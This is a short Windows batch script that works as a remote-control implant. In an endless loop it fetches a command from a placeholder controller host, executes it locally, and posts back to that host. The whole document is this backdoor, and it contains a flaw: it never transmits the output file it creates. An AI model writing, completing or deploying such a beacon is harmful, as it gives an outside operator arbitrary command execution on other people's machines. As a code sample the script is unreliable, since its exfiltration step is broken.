@echo off
:CHECK_COMMAND
curl -fsS -o cmd.txt https://controller.example/cmd.txt
set /p command=<cmd.txt
%command% >output.txt
curl -s -X POST -d "output=!command!" https://controller.example/result
timeout /t 10 >nul
goto CHECK_COMMAND
